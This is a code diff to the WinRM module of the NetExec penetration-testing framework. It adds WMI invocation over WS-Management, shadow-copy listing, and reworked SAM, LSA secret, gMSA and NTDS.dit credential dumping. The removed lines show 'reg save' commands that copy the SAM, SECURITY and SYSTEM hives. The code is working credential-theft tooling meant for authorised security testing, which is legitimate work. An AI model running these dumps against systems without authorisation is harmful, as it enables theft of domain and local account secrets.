@@ -1,7 +1,8 @@
 import os
 import re
-import contextlib
+import binascii
 import base64
+import contextlib
 import traceback
 import requests
 import urllib3
@@ -9,24 +10,28 @@ import logging
 import ntpath
 import xml.etree.ElementTree as ET
 
-from pypsrp.client import Client
 from pypsrp.exceptions import WSManFaultError
-from pypsrp.powershell import RunspacePool
-from pypsrp.wsman import NAMESPACES
+from pypsrp.wsman import NAMESPACES, SelectorSet
+from pypsrp.client import Client
+from Cryptodome.Hash import MD4
+
+from pypsrp.powershell import PSDataStreams, RunspacePool
 from pypsrp.shell import WinRS
-from pypsrp.powershell import PSDataStreams
 from termcolor import colored
 
 from dploot.lib.utils import is_guid, is_credfile
 from impacket.dpapi import MasterKeyFile, MasterKey, CredHist, DomainKey, CredentialFile, deriveKeysFromUser, DPAPI_BLOB, CREDENTIAL_BLOB
-from impacket.examples.secretsdump import LocalOperations, LSASecrets, SAMHashes
+from impacket.examples.secretsdump import LSASecrets, SAMHashes, NTDSHashes
 from impacket.uuid import bin_to_string
 
 from nxc.config import process_secret, host_info_colors
 from nxc.connection import connection, requires_admin
 from nxc.helpers.bloodhound import add_user_bh
 from nxc.helpers.logger import highlight
-from nxc.helpers.misc import gen_random_string
+from nxc.helpers.misc import validate_ntlm
+from nxc.protocols.winrm.file_transfer import FileTransfer
+from nxc.protocols.winrm.remoteops import RemoteOperations
+from nxc.protocols.ldap.gmsa import MSDS_MANAGEDPASSWORD_BLOB
 from nxc.helpers.negotiate_parser import parse_challenge
 from nxc.logger import NXCAdapter
 from nxc.paths import TMP_PATH
@@ -46,6 +51,9 @@ class winrm(connection):
         self.challenge_header = None
         self.targetDomain = None
         self.no_ntlm = False
+        self.shell_types = []
+        self._remote_ops = None
+        self._file_transfer = None
 
         connection.__init__(self, args, db, host)
 
@@ -222,7 +230,7 @@ class winrm(connection):
             )
 
             self.check_if_admin()
-            self.logger.success(f"{self.domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}")
+            self.logger.success(f"{self.domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}{self.mark_shell_access()}")
 
             self.logger.debug(f"Adding credential: {domain}/{self.username}:{self.password}")
             self.db.add_credential("plaintext", domain, self.username, self.password)
@@ -275,7 +283,7 @@ class winrm(connection):
             )
 
             self.check_if_admin()
-            self.logger.success(f"{self.domain}\\{self.username}:{process_secret(nthash)} {self.mark_pwned()}")
+            self.logger.success(f"{self.domain}\\{self.username}:{process_secret(nthash)} {self.mark_pwned()}{self.mark_shell_access()}")
 
             self.db.add_credential("hash", domain, self.username, ntlm_hash)
             user_id = self.db.get_credential("hash", domain, self.username, ntlm_hash)
@@ -297,6 +305,66 @@ class winrm(connection):
                 self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.nthash)} {e!s}")
             return False
 
+    def wmi_invoke(self, namespace, class_name, method, params=None, selector=None):
+        """Invoke a WMI method natively over WS-Management (ExecMethod).
+
+        The method INPUT body is sent in the class resource URI namespace with
+        the parameters as child elements, and the target instance is addressed
+        by a selector on the class key property - the WinRM-equivalent of the
+        smb/wmi protocols calling WMI methods over DCOM. Parameter names must
+        match the class schema (not always the MSDN documentation, e.g.
+        Win32_TerminalServiceSetting.SetAllowTSConnections takes
+        AllowTSConnections, not Allow). No PowerShell process is involved.
+        """
+        namespace_path = namespace.replace("\\", "/")
+        class_uri = f"http://schemas.microsoft.com/wbem/wsman/1/wmi/{namespace_path}/{class_name}"
+        body = ET.Element(f"{{{class_uri}}}{method}_INPUT")
+        for name, value in (params or {}).items():
+            ET.SubElement(body, f"{{{class_uri}}}{name}").text = str(value)
+
+        selector_set = None
+        if selector:
+            selector_set = SelectorSet()
+            for key, value in selector.items():
+                selector_set.add_option(key, value)
+
+        res = self.conn.wsman.invoke(f"{class_uri}/{method}", class_uri, body, selector_set=selector_set)
+        return self.parse_method_output(res)
+
+    @staticmethod
+    def parse_method_output(res):
+        """Flatten a WSMan method output body into a {property: text} dict."""
+        output = {}
+        for element in res.iter():
+            if element.tag.endswith("_OUTPUT"):
+                for prop in element:
+                    output[prop.tag.split("}")[-1]] = prop.text
+        return output
+
+    @requires_admin
+    def list_snapshots(self):
+        drive = self.args.list_snapshots
+        self.logger.info(f"Retrieving volume shadow copies of drive {drive}.")
+        snapshots = self.wql_enumerate(
+            "SELECT ID, DeviceObject, ClientAccessible, InstallDate FROM Win32_ShadowCopy",
+            "root\\cimv2",
+        )
+        if not snapshots:
+            self.logger.info("No volume shadow copies found.")
+            return
+
+        self.logger.highlight(f"{'Drive':<8}{'Shadow Copy ID':<40}{'ClientAccessible':<18}{'InstallDate':<27}{'Device Object':<50}")
+        self.logger.highlight(f"{'------':<8}{'--------------':<40}{'----------------':<18}{'-----------':<27}{'-------------':<50}")
+        for record in snapshots:
+            self.logger.highlight(
+                f"{drive:<8}"
+                f"{record.get('ID') or '':<40}"
+                f"{str(record.get('ClientAccessible', '')).capitalize() if record.get('ClientAccessible') else '':<18}"
+                f"{record.get('InstallDate') or '':<27}"
+                f"{record.get('DeviceObject') or '':<50}"
+            )
+
+    @requires_admin
     def wmi_query(self, wql=None, namespace=None):
         """Run a WQL query natively over WS-Management and print the results.
 
@@ -480,12 +548,11 @@ class winrm(connection):
         # Do a bit of smart handling for the local file path
         if local_path.endswith("/"):
             local_path += ntpath.basename(remote_path)
-        try:
-            self.logger.display(f'Downloading "{remote_path}" to "{local_path}"')
-            self.conn.fetch(remote_path, local_path)
+        self.logger.display(f'Downloading "{remote_path}" to "{local_path}"')
+        if self.file_transfer.get_file(remote_path, local_path):
             self.logger.success(f"File {remote_path} has been saved to {local_path}")
-        except Exception as e:
-            self.logger.fail(f"Failed to get file {remote_path}, error: {e!s}")
+        else:
+            self.logger.fail(f"Failed to get file {remote_path}")
 
     def put_file(self, local_path=None, remote_path=None):
         local_path = local_path if local_path else self.args.put_file[0]
@@ -507,74 +574,196 @@ class winrm(connection):
             for line in out.splitlines():
                 self.logger.highlight(line.rstrip())
 
-    # Dos attack prevent:
-    # if someboby executed "reg save HKLM\sam C:\windows\temp\sam" before, but didn't remove "C:\windows\temp\sam" file,
-    # when user execute the same command next time, in tty shell, the prompt will ask "File C:\windows\temp\sam already exists. Overwrite (Yes/No)?"
-    # but in here, it isn't not a tty shell, pypsrp will do a crazy loop command execution when it didn't get any response (stuck in "Yes/No" prompt)
-    # and it will make target host OOM error just like dos attack.
-    # To prevent that, just make the store file name randomly.
+    @property
+    def remote_ops(self):
+        if self._remote_ops is None:
+            self._remote_ops = RemoteOperations(self, shadow_id=self.args.use_snapshot_id)
+        return self._remote_ops
+
+    @property
+    def file_transfer(self):
+        if self._file_transfer is None:
+            self._file_transfer = FileTransfer(self)
+        return self._file_transfer
+
+    @requires_admin
     def sam(self):
-        sam_storename = gen_random_string(6)
-        system_storename = gen_random_string(6)
-        dump_command = f"reg save HKLM\\SAM C:\\windows\\temp\\{sam_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
-        clean_command = f"del C:\\windows\\temp\\{sam_storename} && del C:\\windows\\temp\\{system_storename}"
+        def add_sam_hash(sam_hash):
+            self.logger.highlight(sam_hash)
+            if "_history" in sam_hash:
+                return
+            username, _, lmhash, nthash, _, _, _ = sam_hash.split(":")
+            add_sam_hash.sam_hashes += 1
+            self.db.add_credential(
+                "hash",
+                self.hostname,
+                username,
+                f"{lmhash}:{nthash}",
+                pillaged_from=host_id,
+            )
+
+        add_sam_hash.sam_hashes = 0
         output_filename = self.output_file_template.format(output_folder="sam")
+
         try:
-            self.conn.execute_cmd(dump_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{dump_command}'")
-            self.conn.fetch(f"C:\\windows\\temp\\{sam_storename}", output_filename + ".sam")
-            self.conn.fetch(f"C:\\windows\\temp\\{system_storename}", output_filename + ".system")
-            self.conn.execute_cmd(clean_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{clean_command}'")
-        except Exception as e:
-            if ("does not exist" in str(e)) or ("TransformFinalBlock" in str(e)):
-                self.logger.fail("Failed to dump SAM hashes, it may have been detected by AV or current user is not privileged user")
-            elif hasattr(e, "code") and e.code == 5:
-                self.logger.fail(f"Dump SAM hashes with {self.args.dump_method} failed, please try '--dump-method'")
-            else:
-                self.logger.fail(f"Failed to dump SAM hashes, error: {e!s}")
-        else:
-            self.logger.display("Dumping SAM hashes")
-            local_operations = LocalOperations(f"{output_filename}.system")
-            boot_key = local_operations.getBootKey()
+            bootkey = self.remote_ops.get_bootkey(output_filename)
+            if bootkey is None:
+                return
+
+            sam_hive_path = self.remote_ops.shadow_path(r"C:\Windows\System32\config\SAM")
+            if not self.remote_ops.get_file(sam_hive_path, f"{output_filename}.sam"):
+                self.logger.fail("Could not get SAM hive")
+                return
+
+            host_id = self.db.get_hosts(self.host)[0][0]
             SAM = SAMHashes(
                 f"{output_filename}.sam",
-                boot_key,
+                bootkey,
                 isRemote=None,
-                perSecretCallback=lambda secret: self.logger.highlight(secret),
+                history=self.args.history,
+                perSecretCallback=lambda secret: add_sam_hash(secret),
             )
+            self.logger.display("Dumping SAM hashes")
             SAM.dump()
             SAM.export(output_filename)
+            self.logger.success(f"Dumped {highlight(add_sam_hash.sam_hashes)} SAM hashes to {output_filename + '.sam'}")
+        finally:
+            self.remote_ops.finish()
 
+    @requires_admin
     def lsa(self):
-        security_storename = gen_random_string(6)
-        system_storename = gen_random_string(6)
-        dump_command = f"reg save HKLM\\SECURITY C:\\windows\\temp\\{security_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
-        clean_command = f"del C:\\windows\\temp\\{security_storename} && del C:\\windows\\temp\\{system_storename}"
+        def add_lsa_secret(secret):
+            add_lsa_secret.secrets += 1
+            self.logger.highlight(secret)
+            if "_SC_GMSA_{84A78B8C" in secret:
+                gmsa_id = secret.split("_")[4].split(":")[0]
+                data = bytes.fromhex(secret.split("_")[4].split(":")[1])
+                blob = MSDS_MANAGEDPASSWORD_BLOB()
+                blob.fromString(data)
+                current_password = blob["CurrentPassword"][:-2]
+                ntlm_hash = MD4.new()
+                ntlm_hash.update(current_password)
+                passwd = binascii.hexlify(ntlm_hash.digest()).decode("utf-8")
+                self.logger.highlight(f"GMSA ID: {gmsa_id:<20} NTLM: {passwd}")
+
+        add_lsa_secret.secrets = 0
         output_filename = self.output_file_template.format(output_folder="lsa")
+
         try:
-            self.conn.execute_cmd(dump_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{dump_command}'")
-            self.conn.fetch(f"C:\\windows\\temp\\{security_storename}", f"{output_filename}.security")
-            self.conn.fetch(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
-            self.conn.execute_cmd(clean_command) if self.args.dump_method == "cmd" else self.conn.execute_ps(f"cmd /c '{clean_command}'")
-        except Exception as e:
-            if ("does not exist" in str(e)) or ("TransformFinalBlock" in str(e)):
-                self.logger.fail("Failed to dump LSA secrets, it may have been detected by AV or current user is not privileged user")
-            elif hasattr(e, "code") and e.code == 5:
-                self.logger.fail(f"Dump LSA secrets with {self.args.dump_method} failed, please try '--dump-method'")
-            else:
-                self.logger.fail(f"Failed to dump LSA secrets, error: {e!s}")
-        else:
-            self.logger.display("Dumping LSA secrets")
-            local_operations = LocalOperations(f"{output_filename}.system")
-            boot_key = local_operations.getBootKey()
+            bootkey = self.remote_ops.get_bootkey(output_filename)
+            if bootkey is None:
+                return
+
+            security_hive_path = self.remote_ops.shadow_path(r"C:\Windows\System32\config\SECURITY")
+            if not self.remote_ops.get_file(security_hive_path, f"{output_filename}.security"):
+                self.logger.fail("Could not get the SECURITY hive")
+                return
+
             LSA = LSASecrets(
                 f"{output_filename}.security",
-                boot_key,
+                bootkey,
                 None,
                 isRemote=None,
-                perSecretCallback=lambda secret_type, secret: self.logger.highlight(secret),
+                perSecretCallback=lambda secret_type, secret: add_lsa_secret(secret),
             )
+            self.logger.display("Dumping LSA secrets")
             LSA.dumpCachedHashes()
+            LSA.exportCached(output_filename)
             LSA.dumpSecrets()
+            LSA.exportSecrets(output_filename)
+            self.logger.success(f"Dumped {highlight(add_lsa_secret.secrets)} LSA secrets to {output_filename + '.secrets'} and {output_filename + '.cached'}")
+        finally:
+            self.remote_ops.finish()
+
+    @requires_admin
+    def ntds(self):
+        host_id = self.db.get_hosts(self.host)[0][0]
+        printed_kerb_keys_banner = False
+
+        def add_hash(secret_type, secret, host_id):
+            nonlocal printed_kerb_keys_banner
+            if self.args.kerberos_keys and not printed_kerb_keys_banner and secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
+                self.logger.display("Kerberos keys:")
+                printed_kerb_keys_banner = True
+
+            # Count the type of secrets
+            if secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
+                add_hash.kerb_secrets += 1
+            else:
+                add_hash.nt_lm_secrets += 1
+
+            # Log the secret based on args
+            if self.args.enabled:
+                if "Enabled" in secret:
+                    secret = " ".join(secret.split(" ")[:-1])
+                    self.logger.highlight(secret)
+            else:
+                secret = " ".join(secret.split(" ")[:-1]) if " " in secret else secret
+                self.logger.highlight(secret)
+
+            # Filter out computer accounts, history hashes and kerberos keys for adding to db
+            if secret.find("$") == -1 and secret_type == NTDSHashes.SECRET_TYPE.NTDS and "_history" not in secret:
+                if secret.find("\\") != -1:
+                    domain, clean_hash = secret.split("\\")
+                else:
+                    domain = self.domain
+                    clean_hash = secret
+
+                try:
+                    username, _, lmhash, nthash, _, _, _ = clean_hash.split(":")
+                    parsed_hash = f"{lmhash}:{nthash}"
+                    if validate_ntlm(parsed_hash):
+                        self.db.add_credential("hash", domain, username, parsed_hash, pillaged_from=host_id)
+                        add_hash.added_to_db += 1
+                        return
+                    raise
+                except Exception:
+                    self.logger.debug("Dumped hash is not NTLM, not adding to db for now ;)")
+            else:
+                self.logger.debug("Dumped hash is a computer account, not adding to db")
+
+        add_hash.nt_lm_secrets = 0
+        add_hash.kerb_secrets = 0
+        add_hash.added_to_db = 0
+        output_filename = self.output_file_template.format(output_folder="ntds")
+        NTDS = None
+
+        try:
+            bootkey = self.remote_ops.get_bootkey(output_filename)
+            if bootkey is None:
+                return
+
+            ntds_file = self.remote_ops.get_ntds(output_filename)
+            if ntds_file is None:
+                return
+
+            NTDS = NTDSHashes(
+                ntds_file,
+                bootkey,
+                isRemote=False,
+                history=self.args.history,
+                noLMHash=True,
+                useVSSMethod=True,
+                justNTLM=not self.args.kerberos_keys,
+                pwdLastSet=False,
+                resumeSession=None,
+                outputFileName=output_filename,
+                justUser=self.args.userntds or None,
+                printUserStatus=True,
+                perSecretCallback=lambda secret_type, secret: add_hash(secret_type, secret, host_id),
+            )
+            self.logger.success("Dumping the NTDS, this could take a while so go grab a redbull...")
+            NTDS.dump()
+            ntds_outfile = f"{output_filename}.ntds"
+            self.logger.success(f"Dumped {highlight(add_hash.nt_lm_secrets)} NTDS hashes to {ntds_outfile} of which {highlight(add_hash.added_to_db)} were added to the database")
+            if self.args.kerberos_keys:
+                self.logger.success(f"Dumped {highlight(add_hash.kerb_secrets)} Kerberos keys to {ntds_outfile}.kerberos")
+            self.logger.display("To extract only enabled accounts from the output file, run the following command: ")
+            self.logger.display(f"grep -iv disabled {ntds_outfile} | cut -d ':' -f1")
+        finally:
+            if NTDS is not None:
+                NTDS.finish()
+            self.remote_ops.finish()
 
     def dpapi(self):
         """
